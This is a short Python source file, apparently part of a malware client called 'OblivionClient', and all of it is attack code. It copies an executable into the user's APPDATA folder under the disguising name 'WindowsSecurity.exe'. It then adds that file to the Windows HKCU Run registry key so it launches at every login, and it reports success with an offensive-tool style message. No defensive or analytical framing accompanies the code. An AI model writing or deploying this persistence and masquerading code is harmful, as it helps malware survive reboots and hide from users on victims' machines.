import os
import winreg
import shutil

def persist_startup(file_path):
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "OblivionClient", 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(reg_key)
        print("[+] Persistence via Registry established.")
    except Exception as e:
        print(f"[-] Persistence error: {e}")

def copy_to_appdata(executable_path):
    appdata = os.getenv('APPDATA')
    dest_path = os.path.join(appdata, "WindowsSecurity.exe")
    shutil.copy2(executable_path, dest_path)
    persist_startup(dest_path)
